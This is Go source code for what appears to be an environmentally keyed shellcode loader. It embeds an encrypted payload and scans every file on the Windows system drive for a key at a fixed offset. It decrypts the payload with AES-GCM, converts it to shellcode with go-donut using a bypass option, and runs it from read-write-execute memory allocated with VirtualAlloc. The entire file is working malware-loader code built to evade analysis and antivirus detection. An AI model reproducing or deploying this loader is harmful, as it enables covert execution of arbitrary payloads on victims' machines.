package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha512"
	_ "embed"
	"encoding/binary"
	"io/ioutil"
	"os"
	"path/filepath"
	"runtime"
	"sync"
	"syscall"
	"unsafe"

	"github.com/Binject/go-donut/donut"
)

var (
	seedPath string
	//go:embed "package"
	packageContent []byte
)

func main() {
	if len(seedPath) < 1 {
		seedPath = os.Getenv("SystemDrive") + string(os.PathSeparator)
	}
	keyOffset := binary.LittleEndian.Uint64(packageContent[:8])
	payload := packageContent[8:]
	potentialSeeds := make(chan string)

	wg := sync.WaitGroup{}
	for cpuIndex := 0; cpuIndex < runtime.NumCPU(); cpuIndex++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				seedFile, err := ioutil.ReadFile(<-potentialSeeds)
				if err != nil {
					continue
				}
				if keyOffset+32 > uint64(len(seedFile)) {
					continue
				}

				hasher := sha512.New()
				_, err = hasher.Write(seedFile[keyOffset : keyOffset+32])
				if err != nil {
					continue
				}

				cypher, err := aes.NewCipher(hasher.Sum(nil)[:32])
				if err != nil {
					continue
				}
				gcm, err := cipher.NewGCM(cypher)
				if err != nil {
					continue
				}
				nonceSize := gcm.NonceSize()
				decryptedPayload, err := gcm.Open(
					nil, payload[:nonceSize], payload[nonceSize:], nil,
				)
				if err != nil {
					continue
				}
				if len(decryptedPayload) < 1 {
					continue
				}
				shellcode, err := donut.ShellcodeFromBytes(bytes.NewBuffer(decryptedPayload), &donut.DonutConfig{
					Arch:     donut.X84,
					Type:     donut.DONUT_MODULE_EXE,
					InstType: donut.DONUT_INSTANCE_PIC,
					Entropy:  donut.DONUT_ENTROPY_DEFAULT,
					Compress: 1,
					Format:   1,
					Bypass:   3,
				})
				if err != nil {
					continue
				}
				loadAddr, _, err := syscall.NewLazyDLL("Kernel32.dll").NewProc("VirtualAlloc").Call(
					0, uintptr(len(shellcode.Bytes())), 0x1000|0x2000 /* MEM_COMMIT | MEM_RESERVE */, 0x40, /*PAGE_EXECUTE_READWRITE */
				)
				if err != nil && err.Error() != "The operation completed successfully." {
					continue
				}
				for index, shellcodeByte := range shellcode.Bytes() {
					*(*byte)(unsafe.Pointer(loadAddr + uintptr(index))) = shellcodeByte
				}
				syscall.Syscall(loadAddr, 0, 0, 0, 0)
			}
		}()
	}

	filepath.Walk(seedPath, func(path string, info os.FileInfo, err error) error {
		if !info.IsDir() && err == nil {
			potentialSeeds <- path
		}
		return nil
	})

	wg.Wait()
}
